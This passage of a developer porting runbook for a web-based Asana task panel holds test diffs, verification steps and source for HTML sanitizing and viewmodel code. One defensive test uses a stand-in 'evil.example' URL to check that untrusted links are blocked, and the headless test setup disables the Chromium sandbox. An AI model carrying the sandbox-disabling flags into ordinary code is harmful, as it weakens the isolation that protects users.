+    # WS-D-WEB task mirror: writes relay to the host's CAS-guarded
+    # asana_writeback lanes behind current-id validation + a single-winner
+    # inflight claim; openUrl/openAttachment are gated on last-pushed-vm
+    # registries. Proven there, plus the AST no-Asana-write-verb fence in
+    # tests/test_task_web_controller.py.
+    "src/ui/web/task_bridge.py": "tests/test_task_bridge.py",
 }
 
 _KNOWN_BRIDGES = {"chat_bridge.py"}   # pre-pivot; gating reviewed 2026-06/07
```

#### D2 `tests/test_task_detail_panel.py` (two appended tests: persistent-widget never reparents; web mode drops shadow + skips slide)

```diff
diff --git a/tests/test_task_detail_panel.py b/tests/test_task_detail_panel.py
index 5764246..fb0b270 100644
--- a/tests/test_task_detail_panel.py
+++ b/tests/test_task_detail_panel.py
@@ -269,6 +269,78 @@ def test_drilldown_widget_mode_hosts_inside_scroll_area(qapp):
     assert inner.parent() is None
 
 
+def test_drilldown_persistent_widget_mode_never_reparents(qapp):
+    """WS-D-WEB blank-panel fix: the web task host is added to the detail
+    stack ONCE and survives close/reopen with its parent intact. The old
+    show_widget path ran setParent(None) on every close — reparenting a
+    QWebEngineView tears down its Chromium compositor and every reopen
+    after the first rendered a white view."""
+    from src.ui.widgets.drilldown_panel import DrilldownPanel
+    dp = DrilldownPanel()
+    web_host = QWidget()
+
+    dp.show_persistent_widget("Task", "Asana", web_host)
+    stack = dp._detail_stack
+    idx = stack.indexOf(web_host)
+    assert idx >= 2, "index 1 (the native scroll area) must not shift"
+    assert isinstance(stack.widget(1), QScrollArea)
+    assert stack.currentIndex() == idx
+    assert web_host.parent() is not None
+
+    dp._on_close_finished()                     # the close path
+    assert web_host.parent() is not None, "close must NEVER orphan the host"
+
+    dp.show_persistent_widget("Task", "Asana", web_host)
+    assert stack.indexOf(web_host) == idx, "added once, reused forever"
+    assert stack.currentIndex() == idx
+    count = stack.count()
+    dp.show_persistent_widget("Task", "Asana", web_host)
+    assert stack.count() == count
+
+    # a native panel can still take over (web → native fallback mid-session)
+    native = QWidget()
+    dp.show_widget("Task", "Asana", native)
+    assert stack.currentIndex() == 1
+    assert web_host.parent() is not None        # persistent page untouched
+    dp._on_close_finished()
+    assert native.parent() is None              # native panels still detach
+
+
+def test_drilldown_web_mode_drops_shadow_and_skips_the_slide(qapp):
+    """WS-D-WEB input fix: a QGraphicsEffect on an ancestor of a
+    QWebEngineView is unsupported (QTBUG-47848 class — stale composite,
+    dead input, stalled sibling repaints) and geometry-animating a live
+    view desyncs Chromium's input mapping (QTBUG-68440 class). Web mode
+    must disable the shadow and open/close with NO animation; native
+    modes keep both."""
+    from src.ui.widgets.drilldown_panel import DrilldownPanel
+    parent = QWidget()
+    parent.resize(1200, 800)
+    parent.show()
+    dp = DrilldownPanel(parent)
+    web_host = QWidget()
+
+    assert dp.graphicsEffect() is not None
+    assert dp.graphicsEffect().isEnabled()
+
+    dp.show_persistent_widget("Task", "Asana", web_host)
+    assert dp.graphicsEffect().isEnabled() is False   # no effect over the view
+    assert dp._anim is None                           # no open animation
+    assert dp.isVisible()
+    assert dp.geometry().width() == 440               # at final geometry now
+
+    dp._slide_closed()                                # web mode: instant close
+    assert dp._anim is None
+    assert not dp.isVisible()
+    assert dp.graphicsEffect().isEnabled() is True    # restored on close
+
+    dp.show_persistent_widget("Task", "Asana", web_host)
+    assert dp.graphicsEffect().isEnabled() is False
+    native = QWidget()
+    dp.show_widget("Task", "Asana", native)
+    assert dp.graphicsEffect().isEnabled() is True    # native mode restores
+
+
 # ── DB round-trip: extras as stored by asana_extras render faithfully ─
 
 def test_extras_db_roundtrip_renders(qapp, empty_db):
```

#### D3 `tests/test_help_claims_plan.py` (appended TestTaskPanelMirror class — 8 claim locks for the new article)

NOTE: this box's copy of the file may differ ABOVE the append point; the diff
below only appends at end-of-file plus relies on the file's existing imports
(`SimpleNamespace`, `awb`, `EnablementPage` — all present since the file's
creation). If the trailing context does not match, append the `+` block at
the very end of the file instead, and report that you did so.

```diff
diff --git a/tests/test_help_claims_plan.py b/tests/test_help_claims_plan.py
index 92b1539..83c8f28 100644
--- a/tests/test_help_claims_plan.py
+++ b/tests/test_help_claims_plan.py
@@ -1852,3 +1852,131 @@ class TestDragReschedule:
         # ... which is the same function name the detail panel's due field wires.
         panel_src = inspect.getsource(EnablementPage._show_task_detail)
         assert '_run_task_writeback("update_due_in_asana"' in panel_src
+
+
+class TestTaskPanelMirror:
+    """task-panel-mirror.md — the Asana-style web task panel."""
+
+    def test_on_by_default_with_the_settings_escape_hatch(self, monkeypatch):
+        """task-panel-mirror.md: "The Asana-style panel is on by default …
+        set ``enablement.task_web: false`` in the settings file" — and a
+        settings error keeps the default rather than killing the surface."""
+        import src.data.settings_manager as sm
+        from src.ui.web.web_flags import task_web_enabled
+
+        monkeypatch.setattr(sm, "get_section", lambda *_a, **_k: {})
+        assert task_web_enabled() is True, "on by default"
+        monkeypatch.setattr(sm, "get_section",
+                            lambda *_a, **_k: {"task_web": False})
+        assert task_web_enabled() is False, "the escape hatch"
+        def boom(*_a, **_k):
+            raise RuntimeError("settings unreadable")
+        monkeypatch.setattr(sm, "get_section", boom)
+        assert task_web_enabled() is True, "an unreadable kill switch is not a kill"
+
+    def test_construction_failure_quietly_shows_the_classic_panel(self, monkeypatch):
+        """task-panel-mirror.md: "if the new panel cannot be built on your
+        machine, the app quietly shows the classic panel instead"."""
+        import src.ui.web.task_host as th
+
+        def boom(**_kw):
+            raise RuntimeError("no webengine")
+
+        monkeypatch.setattr(th, "build_task_web_triple", boom)
+        stub = SimpleNamespace(_run_task_writeback=lambda *a: None,
+                               _run_task_refresh=lambda *a: None,
+                               _open_source_url=lambda u: None,
+                               _set_status=lambda s: None)
+        assert EnablementPage._get_task_web_host(stub) == (None, None)
+        assert EnablementPage._task_web_available(stub) is False
+        # ... and _show_task_detail's web branch precedes the classic panel
+        # construction, which remains in place as the fall-through.
+        import inspect
+        src = inspect.getsource(EnablementPage._show_task_detail)
+        assert "_task_web_available" in src
+        assert "TaskDetailPanel(task)" in src
+
+    def test_the_writeback_lanes_four_shared_plus_mirror_additions(self):
+        """task-panel-mirror.md: "the same four background write-back
+        lanes … New with this panel": subtask completion + description
+        editing — six lanes total, every one a real asana_writeback
+        function."""
+        from src.services.task_web import _LANES
+        assert set(_LANES.values()) == {
+            "set_completed_in_asana", "update_due_in_asana",
+            "post_comment_to_asana", "create_subtask_in_asana",
+            "set_subtask_completed_in_asana", "update_description_in_asana"}
+        for lane in _LANES.values():
+            assert callable(getattr(awb, lane)), lane
+
+    def test_description_save_is_remote_first(self):
+        """task-panel-mirror.md: "This write is conflict-protected and
+        remote-first: if Asana refuses it, nothing changes anywhere"."""
+        import inspect
+        src = inspect.getsource(awb.update_description_in_asana)
+        assert "_cas_precheck" in src, "conflict-protected"
+        # the PUT precedes every local mutation in the linked path
+        put = src.index("c.update_task(")
+        assert put < src.index("set_html_notes")
+        assert put < src.rindex("et.update_task(conn, tid, description=")
+
+    def test_only_links_the_task_carries_will_open(self):
+        """task-panel-mirror.md: "The panel will only open a link that the
+        task actually carries — a link that isn't part of the task's own
+        content goes nowhere"."""
+        from src.services.task_web import TaskWebController
+        opened = []
+        ctrl = TaskWebController(open_url_fn=opened.append)
+        ctrl.show_task({
+            "task_id": "t1", "source": "asana", "source_ref": "9001",
+            "title": "x", "source_url": "https://app.asana.com/0/1/9001",
+            "extras": {"stories": [
+                {"gid": "s1", "subtype": "comment_added", "author": "A",
+                 "text": "see https://doc.example/z",
+                 "created_at": "2026-07-01T00:00:00Z"}]},
+        })
+        ctrl.js_open_url("https://evil.example/")
+        assert opened == []
+        ctrl.js_open_url("https://doc.example/z")
+        ctrl.js_open_url("https://app.asana.com/0/1/9001")
+        assert opened == ["https://doc.example/z",
+                          "https://app.asana.com/0/1/9001"]
+
+    def test_only_a_full_changed_date_is_sent(self):
+        """task-panel-mirror.md: "Only a full, changed date is sent"."""
+        from src.services.task_web import TaskWebController
+        writes = []
+        ctrl = TaskWebController(
+            write_fn=lambda lane, tid, *a: writes.append((lane, tid) + a))
+        ctrl.show_task({"task_id": "t1", "source": "asana",
+                        "source_ref": "9001", "title": "x",
+                        "due_iso": "2026-09-01"})
+        for bad in ("2026-9-1", "tomorrow", "", None, "2026-09-011"):
+            ctrl.js_set_due("t1", bad)
+        ctrl.js_set_due("t1", "2026-09-01")     # unchanged
+        assert writes == []
+        ctrl.js_set_due("t1", "2026-09-15")
+        assert writes == [("update_due_in_asana", "t1", "2026-09-15")]
+
+    def test_attachments_resolve_fresh_and_open_web_links_only(self):
+        """task-panel-mirror.md: "Attachment URLs are never stored. Clicking
+        one asks Asana for a fresh link right then, and only web links
+        open"."""
+        import inspect
+        from src.services import task_web
+        src = inspect.getsource(task_web.TaskWebController)
+        assert "get_attachment" in src, "a fresh per-click resolve"
+        assert 'startswith(("http://", "https://"))' in src, "web links only"
+        # show_task itself fetches nothing — the panel renders synced data.
+        shown = inspect.getsource(task_web.TaskWebController.show_task)
+        assert "client_factory" not in shown and "get_attachment" not in shown
+
+    def test_rule_posted_entries_split_from_human_comments(self):
+        """task-panel-mirror.md: "Rule-posted entries show with a ⚡ marker
+        instead of an avatar" — the split is authorless comment_added
+        stories; status changes render as quiet system rows."""
+        from src.services.task_vm import story_kind
+        assert story_kind({"subtype": "comment_added", "author": "Dana"}) == "comment"
+        assert story_kind({"subtype": "comment_added", "author": ""}) == "automation"
+        assert story_kind({"subtype": "marked_complete", "author": "Dana"}) == "system"
+        assert story_kind({"author": "Dana"}) == "comment", "pre-058 rows stay comments"
```

## 4. Full verification matrix (run in groups, zombies killed first)

```bash
python -m pytest tests/test_task_detail_panel.py tests/test_asana_monitor.py tests/test_web_guardrails.py -q
# expected: 66 passed
python -m pytest tests/test_task_web_controller.py tests/test_task_bridge.py tests/test_asana_rich.py -q
# expected: 98 passed (or 97 passed 1 skipped — group-order skip, fine)
python -m pytest "tests/test_help_claims_plan.py::TestTaskPanelMirror" -q
# expected: 8 passed
npm --prefix web run test
# expected: baseline + 96
```

**Known-expected failures that are NOT this port's problem:** the full
`tests/test_help_claims_plan.py` file carries pre-existing stale-drift
failures on the source box (8 there: TestDragReschedule×3, TestAsanaSetup×3,
TestCardDueChips×2 — the 2026-07-24 Zendesk `VALID_MODES` enum change). If
this box shows the same class of failures outside `TestTaskPanelMirror`,
leave them alone.

**App-level smoke:** launch the app → enablement → Calendar → open any Asana
task. The drilldown should render the Asana-style panel (white, avatar,
field pills where fields exist). Scroll must work. Click a subtask name → a
promoted subtask opens in-panel. `Description → Edit → Save` on a test task
must show a result line beside Save ("Synced to Asana." or the conflict
retry message — if conflict: click the panel's ↻, then Save again). If the
panel comes up as the OLD native panel instead, that is the construction
fallback working — check the log for "web task panel unavailable" and run
`python scripts/web_diag.py` before anything else.

## 5. Mac-specific notes

- **First stop on any blank/odd web render: `python scripts/web_diag.py`**
  (framework corruption / Rosetta page-size are the known Mac failure
  modes — see the existing Mac runbooks).
- Headless WebEngine checks on this box need the usual offscreen flags:
  `QT_QPA_PLATFORM=offscreen QTWEBENGINE_DISABLE_SANDBOX=1
  QTWEBENGINE_CHROMIUM_FLAGS="--no-sandbox --disable-gpu
  --disable-software-rasterizer --in-process-gpu"`; offscreen grabs are
  always blank — assert via runJavaScript, never screenshots.
- Everything in this port is pure-Python/stdlib + PySide6 + the SPA — no
  Windows-isms (`webbrowser`, `threading`, `html.parser` only).
- Migration 058 is a single idempotent ALTER; the schema migrator applies it
  on first launch. No manual DB step.
- The web panel is DEFAULT-ON (`web_flags.task_web_enabled`). The hand-edit
  kill switch is `enablement.task_web: false` in `data/settings.yaml`; the
  native panel remains the automatic construction-failure fallback.

## 6. OPTIONAL but recommended: the run-singly WebEngine local test

This file is gitignored on every box (`tests/test_*_local.py`) and therefore
not in the fetch — create it verbatim, then run it SINGLY:

```bash
python -m pytest tests/test_task_web_local.py -q   # run ALONE, never grouped
```

```python
"""LOCAL (gitignored) round-trip proof for the web task drilldown (WS-D-WEB):

the real dist/index.html#/task route inside a QWebEngineView, fed by a real
TaskWebController over QWebChannel — no server. Proves: the route mounts
(window.__almaTaskMounted), a pushed viewmodel renders into the page (assert
via runJavaScript, NEVER screenshots — offscreen grabs are always blank),
TWO consecutive pushes both render (the cee4c86 channel-delivery-death
catcher), and a write invoke crosses JS -> Python into the fake host lane
with the actionResolved ack crossing back.

Run SINGLY (offscreen WebEngine teardown exits 255 when stacked):
  QT_QPA_PLATFORM=offscreen python -m pytest tests/test_task_web_local.py -q
"""

from __future__ import annotations

import os
import time

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
os.environ.setdefault("QTWEBENGINE_DISABLE_SANDBOX", "1")
os.environ.setdefault(
    "QTWEBENGINE_CHROMIUM_FLAGS",
    "--no-sandbox --disable-gpu --disable-software-rasterizer --in-process-gpu")

import pytest
from PySide6.QtWidgets import QApplication
# import WebEngine widgets BEFORE the QApplication is constructed
from PySide6.QtWebEngineWidgets import QWebEngineView  # noqa: F401,E402

from src.ui.web.task_host import build_task_web_triple  # noqa: E402


@pytest.fixture(scope="module")
def app():
    return QApplication.instance() or QApplication([])


def _task(n=1, title="BCBSMA copay update — member messaging"):
    return {
        "task_id": f"t{n}", "source": "asana", "source_ref": f"90010{n}",
        "title": title, "status": "in_progress",
        "assignee": "Jordan Avery", "due_iso": "2026-09-01",
        "due_date": "2026-09-01",
        "source_url": f"https://app.asana.com/0/1/90010{n}",
        "board_names": ["CX Requests"],
        "subtasks": [{"text": "Draft card", "done": False,
                      "assignee": "Renn Ops", "due": "2026-08-20"}],
        "extras": {
            "fetched_at": "2026-08-10T11:55:00+00:00",
            "html_notes": "<p><strong>Describe your request.</strong></p>"
                          "<p>Update the copay macros.</p>",
            "custom_fields": [
                {"gid": "f1", "name": "Request Type",
                 "resource_subtype": "enum", "display_value": "Guru: Update",
                 "enum_value": {"name": "Guru: Update", "color": "green"}},
            ],
            "attachments": [{"gid": "a1", "name": "thread", "host": "slack"}],
            "stories": [
                {"gid": "s1", "text": "Kicking this off for the pilot.",
                 "created_at": "2026-07-02T12:00:00Z", "author": "Dana W",
                 "subtype": "comment_added"},
            ],
            "task_fields": {"start_on": "2026-08-15", "due_on": "2026-09-01",
                            "followers": [{"name": "Priya Nair"}]},
        },
    }


def _eval(view, expr, timeout=10.0):
    end = time.monotonic() + timeout
    state = {"done": False, "val": None}
    view.page().runJavaScript(expr, lambda r: state.update(done=True, val=r))
    while not state["done"] and time.monotonic() < end:
        QApplication.processEvents()
        time.sleep(0.01)
    return state["val"]


def _wait(view, expr, timeout=20.0):
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        if _eval(view, expr, timeout=2.0) is True:
            return True
        QApplication.processEvents()
        time.sleep(0.05)
    return False


def test_mount_two_pushes_and_write_round_trip(app):
    calls = {"write": [], "refresh": [], "urls": []}
    ctrl, bridge, host = build_task_web_triple(
        write_fn=lambda lane, tid, *a: calls["write"].append((lane, tid) + a),
        refresh_fn=lambda tid, gid: calls["refresh"].append((tid, gid)),
        open_url_fn=lambda u: calls["urls"].append(u))
    view = host.view

    assert _wait(view, "window.__almaTaskMounted === true"), "route never mounted"
    assert bridge.parent() is host, "WebHost must parent the orphan bridge"

    # ── push 1 renders ────────────────────────────────────────────────
    ctrl.show_task(_task(1))
    assert _wait(view, "!!window.__almaTaskVm && window.__almaTaskVm.task_id === 't1'")
    body = _eval(view, "document.body.innerText")
    assert "BCBSMA copay update" in body
    assert "Request Type" in body and "Guru: Update" in body
    assert "Kicking this off for the pilot." in body
    assert "Aug 15, 2026 – Sep 1, 2026" in body       # the due RANGE
    assert "Draft card" in body                        # subtask row
    # placeholders are attributes, not text content
    assert _eval(view, "document.querySelector('.tk-subtask-input').placeholder") \
        == "Type to add a subtask…"
    # the ONE html sink is a sandboxed iframe
    assert _eval(view, "document.querySelectorAll('iframe[sandbox=\"\"]').length") == 1

    # ── push 2 still renders (cee4c86: channel delivery must survive) ──
    ctrl.show_task(_task(2, title="Second task — quiz rollout"))
    assert _wait(view, "window.__almaTaskVm && window.__almaTaskVm.task_id === 't2'"), \
        "SECOND push never reached JS — suspect a dynamic slot on the bridge"
    body2 = _eval(view, "document.body.innerText")
    assert "Second task — quiz rollout" in body2

    # ── JS -> Python write relay + actionResolved ack back ────────────
    _eval(view, "window.taskBridge.toggleComplete('t2', true)")
    assert _wait(view, "!!window.__almaTaskAction && window.__almaTaskAction.ok === true")
    assert calls["write"] == [("set_completed_in_asana", "t2", True)]

    # forged id: silent no-op Python-side, non-oracular ack JS-side
    _eval(view, "window.taskBridge.toggleComplete('forged', true)")
    assert _wait(view, "window.__almaTaskAction && window.__almaTaskAction.ok === false")
    assert len(calls["write"]) == 1

    # ── liveness probe (runJavaScript never awaits promises — poll) ───
    _eval(view, "window.__pong = null; "
                "window.taskBridge.ping(function(r){ window.__pong = r; }); true")
    assert _wait(view, "window.__pong === 'pong'")


def test_description_editor_save_relays_markdown(app):
    calls = {"write": []}
    ctrl, bridge, host = build_task_web_triple(
        write_fn=lambda lane, tid, *a: calls["write"].append((lane, tid) + a),
        refresh_fn=lambda *a: None, open_url_fn=lambda u: None)
    view = host.view
    assert _wait(view, "window.__almaTaskMounted === true")
    ctrl.show_task(_task(1))
    assert _wait(view, "!!window.__almaTaskVm && window.__almaTaskVm.task_id === 't1'")
    assert _eval(view, "typeof window.taskBridge.updateDescription") == "function"

    _eval(view, "document.querySelector('.tk-desc-edit-btn').click(); true")
    assert _wait(view, "!!document.querySelector('.tk-desc-input')")
    _eval(view, """
      (() => {
        const ta = document.querySelector('.tk-desc-input');
        ta.value = '**probe** body';
        ta.dispatchEvent(new Event('input', {bubbles: true}));
        document.querySelector('.tk-desc-editor button[type=submit]').click();
        return true;
      })()
    """)
    end = time.monotonic() + 8
    while not calls["write"] and time.monotonic() < end:
        QApplication.processEvents()
        time.sleep(0.02)
    assert calls["write"] == [
        ("update_description_in_asana", "t1", "**probe** body")]


if __name__ == "__main__":
    import sys
    sys.exit(pytest.main([__file__, "-q"]))
```

---
*Generated from the source box on 2026-08-10 after all four commits were
live-verified against real Asana (subtask toggle, comment post, description
round-trip both directions). Questions → the build log in the repo owner's
plan file (`asana-mirror-sidebar.md` §7.5).*


---

# Appendix A — full contents of every new file

Fences are 4-tilde (`~~~~`) so backticks inside the code can never
terminate a block. Everything between the fence lines is file
content, byte-for-byte.

## A · `src/data/asana_rich.py`  — 84 lines · sha256 `f705da45076aafca93398faa8fc191ac1998b64cfcff8504572a7eea55b463f3`

~~~~
"""Markdown → Asana ``html_notes`` dialect (WS-D-WEB description editing).

Asana's rich-text PUT accepts a STRICT XML-ish subset wrapped in <body>:
h1 h2 strong em u s code pre blockquote ol ul li a[href] hr br — no <p>
(paragraph breaks are newlines), no <div>, no attributes beyond a@href.
Anything outside the subset makes the whole PUT fail with "XML is invalid",
so this serializer maps or unwraps every tag rather than passing them
through: p→text+newlines, h3..h6→h2, b/i→strong/em, unknown→unwrapped
children. Text is XML-escaped; hrefs are kept only for http(s).

Flat + Qt-free; the writeback lane is the only production caller.
"""

from __future__ import annotations

from html import escape
from html.parser import HTMLParser

_PASS = {"strong", "em", "u", "s", "code", "pre", "blockquote",
         "ol", "ul", "li", "h1", "h2"}
_MAP = {"b": "strong", "i": "em", "del": "s", "strike": "s",
        "h3": "h2", "h4": "h2", "h5": "h2", "h6": "h2"}
_VOID = {"br": "<br>", "hr": "<hr>"}
_DROP_WITH_CONTENT = {"script", "style", "head", "iframe"}
_BLOCK_BREAK = {"p", "div", "section", "article"}


class _AsanaSerializer(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.out: list[str] = []
        self._open: list[str] = []
        self._skip = 0

    def handle_starttag(self, tag, attrs):
        if self._skip or tag in _DROP_WITH_CONTENT:
            if tag in _DROP_WITH_CONTENT:
                self._skip += 1
            return
        if tag in _VOID:
            self.out.append(_VOID[tag])
            return
        tag = _MAP.get(tag, tag)
        if tag in _PASS:
            self.out.append(f"<{tag}>")
            self._open.append(tag)
        elif tag == "a":
            href = next((v for k, v in attrs if k == "href"), "") or ""
            if href.lower().startswith(("http://", "https://")):
                self.out.append(f'<a href="{escape(href, quote=True)}">')
                self._open.append("a")
        # everything else unwraps — children still serialize

    def handle_endtag(self, tag):
        if tag in _DROP_WITH_CONTENT:
            self._skip = max(0, self._skip - 1)
            return
        if self._skip:
            return
        tag = _MAP.get(tag, tag)
        if self._open and self._open[-1] == tag:
            self.out.append(f"</{self._open.pop()}>")
        elif tag in _BLOCK_BREAK:
            self.out.append("\n")

    def handle_data(self, data):
        if not self._skip and data:
            self.out.append(escape(data))


def to_asana_html(markdown: str) -> str:
    """Markdown → ``<body>…</body>`` in Asana's html_notes dialect."""
    from src.data.html_markdown import markdown_to_html
    html = markdown_to_html(markdown or "") or ""
    ser = _AsanaSerializer()
    try:
        ser.feed(html)
        ser.close()
    except Exception:  # noqa: BLE001 — hostile input degrades to escaped text
        return "<body>" + escape(str(markdown or "")) + "</body>"
    while ser._open:  # balance anything the parser left dangling
        ser.out.append(f"</{ser._open.pop()}>")
    body = "".join(ser.out).strip()
    return f"<body>{body}</body>"
~~~~

## A · `src/services/task_vm.py`  — 421 lines · sha256 `963ea3be8670aeb9f9a034b294d01fb73d6e4a0a35d2c5118f32303ac18d3dd5`

~~~~
"""Pure viewmodel builders for the web task mirror (WS-D-WEB M2).

Flat, table-driven, Qt-free transforms of the SAME enriched task dict that
page.py hands the native ``TaskDetailPanel`` (extras + board_names + rich
subtasks injected) — native/web parity is by construction (one input), locked
by tests/test_task_web_controller.py. ``src/services`` must not import
``src/ui``, so the display formatting the native panel implements privately
is duplicated here on purpose; the parity test is the anti-drift guard.

Every builder is total: any missing/garbage key degrades to a rendered
default, never an exception — the JS side re-normalizes but must never need to.
"""

from __future__ import annotations

import re
from datetime import datetime, timezone
from html.parser import HTMLParser

TEXT_CAP = 6000  # task_brief._INPUT_CHAR_CAP — the repo body-cap convention

_MONTHS = ("Jan", "Feb", "Mar", "Apr", "May", "Jun",
           "Jul", "Aug", "Sep", "Oct", "Nov", "Dec")

# Deterministic per-user avatar fill from the Asana project-color palette.
_AVATAR_COLORS = ("#4186e0", "#aa62e3", "#20aaea", "#62d26f", "#ea4e9d",
                  "#fd612c", "#37c5ab", "#7a6ff0", "#e8384f", "#8da3a6")

# Asana custom-field option colors are palette NAMES ("green", "yellow-green",
# "hot-pink"…) which map 1:1 onto task.css's .tk-pill--<name> classes.
_PILL_COLORS = frozenset((
    "red", "orange", "yellow-orange", "yellow", "yellow-green", "green",
    "blue-green", "aqua", "blue", "indigo", "purple", "magenta", "hot-pink",
    "pink", "cool-gray",
))

_URL_RE = re.compile(r"https?://[^\s<>\"')\]]+")
_TRUTHY = frozenset(("true", "checked", "yes", "1"))


def _s(value) -> str:
    return value if isinstance(value, str) else ("" if value is None else str(value))


def _lst(value) -> list:
    return list(value) if isinstance(value, (list, tuple)) else []


def initials(name: str) -> str:
    parts = [p for p in _s(name).split() if p]
    if not parts:
        return "?"
    first = parts[0][0]
    last = parts[-1][0] if len(parts) > 1 else ""
    return (first + last).upper()


def avatar(name) -> dict | None:
    name = _s(name).strip()
    if not name:
        return None
    color = _AVATAR_COLORS[sum(ord(c) for c in name) % len(_AVATAR_COLORS)]
    return {"name": name, "initials": initials(name), "color": color}


def fmt_date(iso, *, year_always: bool = True, now=None) -> str:
    """``2025-10-17`` → ``Oct 17, 2025`` (Asana's `MMM D, YYYY`); short form
    drops the year when it matches today's. Non-dates pass through."""
    raw = _s(iso).strip()[:10]
    try:
        d = datetime.strptime(raw, "%Y-%m-%d")
    except ValueError:
        return _s(iso).strip()
    if not year_always and d.year == (now or datetime.now()).year:
        return f"{_MONTHS[d.month - 1]} {d.day}"
    return f"{_MONTHS[d.month - 1]} {d.day}, {d.year}"


def fmt_date_range(start_iso, due_iso) -> str:
    """Asana's due display: ``Start – Due`` with a spaced en dash, or the
    single date, or empty."""
    start = fmt_date(start_iso) if _s(start_iso).strip() else ""
    due = fmt_date(due_iso) if _s(due_iso).strip() else ""
    if start and due:
        return f"{start} – {due}"
    return due or start


def fmt_story_ts(iso) -> str:
    """ISO story timestamp → local ``Jul 14, 6:22 PM`` (the native panel's
    _fmt_story_ts semantics), degrading to ``iso[:10]``."""
    raw = _s(iso).strip()
    try:
        dt = datetime.fromisoformat(raw.replace("Z", "+00:00"))
        if dt.tzinfo is not None:
            dt = dt.astimezone()
        hour = dt.hour % 12 or 12
        ampm = "AM" if dt.hour < 12 else "PM"
        return f"{_MONTHS[dt.month - 1]} {dt.day}, {hour}:{dt.minute:02d} {ampm}"
    except ValueError:
        return raw[:10]


def rel_time(iso, *, now=None) -> str:
    """Freshness wording, mirroring the native panel: just now / 5m ago /
    3h ago / 2d ago / — ."""
    raw = _s(iso).strip()
    if not raw:
        return "—"
    try:
        dt = datetime.fromisoformat(raw.replace("Z", "+00:00"))
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=timezone.utc)
        ref = now or datetime.now(timezone.utc)
        secs = max(0, (ref - dt).total_seconds())
    except ValueError:
        return "—"
    if secs < 60:
        return "just now"
    if secs < 3600:
        return f"{int(secs // 60)}m ago"
    if secs < 86400:
        return f"{int(secs // 3600)}h ago"
    return f"{int(secs // 86400)}d ago"


class _HtmlTokens(HTMLParser):
    """Asana ``html_text`` → typed tokens. Anchors become link tokens (or
    mention tokens when the anchor text is an @-handle); everything else is
    plain text. No markup survives — the feed renders tokens, never HTML."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.tokens: list[dict] = []
        self._href = ""
        self._link_text: list[str] = []
        self._skip = 0   # depth inside script/style — content is dropped

    def handle_starttag(self, tag, attrs):
        if tag in ("script", "style"):
            self._skip += 1
        elif tag == "a" and not self._href:
            href = next((v for k, v in attrs if k == "href"), "") or ""
            self._href = href.strip()
            self._link_text = []
        elif tag in ("br", "p", "li") and not self._href:
            self._text("\n")

    def handle_endtag(self, tag):
        if tag in ("script", "style"):
            self._skip = max(0, self._skip - 1)
        elif tag == "a" and self._href:
            label = "".join(self._link_text).strip()
            href = self._href
            self._href = ""
            if label.startswith("@"):
                self.tokens.append({"t": "mention", "v": label[1:], "href": ""})
            elif href.lower().startswith(("http://", "https://")):
                self.tokens.append({"t": "link", "v": label or href, "href": href})
            elif label:
                self._text(label)

    def handle_data(self, data):
        if self._skip:
            return
        if self._href:
            self._link_text.append(data)
        else:
            self._text(data)

    def _text(self, data):
        if not data:
            return
        if self.tokens and self.tokens[-1]["t"] == "text":
            self.tokens[-1]["v"] += data
        else:
            self.tokens.append({"t": "text", "v": data, "href": ""})


def tokenize_text(text) -> list[dict]:
    """Plain story text → tokens with bare URLs auto-linked."""
    text = _s(text)[:TEXT_CAP]
    tokens, pos = [], 0
    for m in _URL_RE.finditer(text):
        if m.start() > pos:
            tokens.append({"t": "text", "v": text[pos:m.start()], "href": ""})
        tokens.append({"t": "link", "v": m.group(0), "href": m.group(0)})
        pos = m.end()
    if pos < len(text):
        tokens.append({"t": "text", "v": text[pos:], "href": ""})
    return tokens


def tokens_from_story(story: dict) -> list[dict]:
    html = _s(story.get("html"))
    if html:
        parser = _HtmlTokens()
        try:
            parser.feed(html[:TEXT_CAP])
            parser.close()
            if parser.tokens:
                return parser.tokens
        except Exception:  # noqa: BLE001 — hostile bytes degrade to plain text
            pass
    return tokenize_text(story.get("text"))


def story_kind(story: dict) -> str:
    """comment_added + human author → comment; comment_added without an
    author → rule/automation; every other subtype → system row. Missing
    subtype = pre-058 stored row, which was comments-only by construction."""
    subtype = _s(story.get("subtype")).strip() or "comment_added"
    if subtype == "comment_added":
        return "comment" if _s(story.get("author")).strip() else "automation"
    return "system"


def story_vm(story: dict) -> dict:
    story = story if isinstance(story, dict) else {}
    return {
        "gid": _s(story.get("gid")),
        "kind": story_kind(story),
        "author": avatar(story.get("author")),
        "when": fmt_story_ts(story.get("created_at")),
        "tokens": tokens_from_story(story),
    }


def _infer_kind(cf: dict) -> str:
    subtype = _s(cf.get("resource_subtype")).strip()
    if subtype in ("enum", "multi_enum", "people", "date", "number", "text",
                   "checkbox"):
        return subtype
    if cf.get("enum_value") is not None:
        return "enum"
    if cf.get("multi_enum_values"):
        return "multi_enum"
    if cf.get("people_value"):
        return "people"
    if cf.get("date_value"):
        return "date"
    if cf.get("number_value") is not None:
        return "number"
    return "text"


def _pill(option) -> dict | None:
    option = option if isinstance(option, dict) else {}
    text = _s(option.get("name")).strip()
    if not text:
        return None
    color = _s(option.get("color")).strip().lower()
    return {"text": text, "color": color if color in _PILL_COLORS else ""}


def _field_pills(cf: dict, kind: str) -> list[dict]:
    if kind == "enum":
        pill = _pill(cf.get("enum_value"))
        return [pill] if pill else []
    if kind == "multi_enum":
        return [p for p in (_pill(o) for o in cf.get("multi_enum_values") or [])
                if p]
    return []


def field_vm(cf: dict) -> dict:
    cf = cf if isinstance(cf, dict) else {}
    kind = _infer_kind(cf)
    value = _s(cf.get("display_value")).strip()
    if kind == "date" and isinstance(cf.get("date_value"), dict):
        value = fmt_date(cf["date_value"].get("date")) or value
    return {
        "gid": _s(cf.get("gid")),
        "name": _s(cf.get("name")).strip(),
        "kind": kind,
        "value": value[:TEXT_CAP],
        "pills": _field_pills(cf, kind),
        "people": [a for a in (avatar((p or {}).get("name"))
                               for p in cf.get("people_value") or []) if a],
        "checked": value.lower() in _TRUTHY,
    }


def fields_vm(extras: dict) -> list[dict]:
    fields = _lst(extras.get("custom_fields")) if isinstance(extras, dict) else []
    return [f for f in (field_vm(cf) for cf in fields) if f["name"]]


def header_vm(task: dict, extras: dict, *, now=None) -> dict:
    tf = (extras.get("task_fields") or {}) if isinstance(extras, dict) else {}
    completed = task.get("status") == "done" or bool(tf.get("completed"))
